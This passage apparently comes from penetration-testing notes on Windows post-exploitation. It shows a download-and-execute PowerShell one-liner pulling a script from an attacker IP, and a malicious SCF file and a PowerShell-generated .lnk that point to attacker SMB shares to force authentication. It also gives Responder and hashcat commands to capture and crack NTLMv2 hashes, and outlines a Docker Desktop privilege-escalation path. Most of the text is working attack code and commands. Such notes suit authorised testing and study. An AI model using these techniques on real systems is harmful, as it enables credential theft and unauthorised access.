**Traffic Capture
- Wireshark
- tcpdump
- net-creds

## Process Command Lines

**Monitoring for Process Command Lines
```procmon.ps1
while($true)
{

  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2

}
```

**Running Monitor Script on Target Host
```ps
IEX (iwr 'http://10.10.10.205/procmon.ps1') 
```

## Vulnerable Services

https://medium.com/@morgan.henry.roman/elevation-of-privilege-in-docker-for-windows-2fd8450b478e
- Docker Desktop Community Edition 2.1.0.1
- Allows all users to write to C:\PROGRAMDATA\DockerDesktop\version-bin\ folder
- Create executable that runs when Docker applicaitons starts and when a user authenticates using the command 'docker login.'

## SCF on a File Share

SCF - Shell Command File
We can change the icon file location of an SCF file to point to a specific UNC path and have Windows Explorer start an SMB session when the folder where the .scf file resides is accessed.
Run Repsonder, Inveigh, or InveighZero to capture NTMLv2 password hashes.

**Malicious SCF File
1. Name the file '@Inventory.scf'
```
[Shell]
Command=2
IconFile=\\10.10.14.3\share\legit.ico
[Taskbar]
Command=ToggleDesktop
```
2. Start Responder
```
sudo responder -wrf -v -I tun0
```
3. Cracking NTLMv2 Hash with Hashcat
```
hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt
```


## Capturing Hashes with a Malicious .lnk File

Using SCFs no longer works on Server 2019 hosts, but we can achieve the same effect using a malicious .lnk file

**Generating a Malicious .lnk File
https://github.com/dievus/lnkbomb
```ps
$objShell = New-Object -ComObject WScript.Shell
$lnk = $objShell.CreateShortcut("C:\legit.lnk")
$lnk.TargetPath = "\\10.10.15.5\@pwn.png"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "Browsing to the directory where this file is saved will trigger an auth request."
$lnk.HotKey = "Ctrl+Alt+O"
$lnk.Save()
```
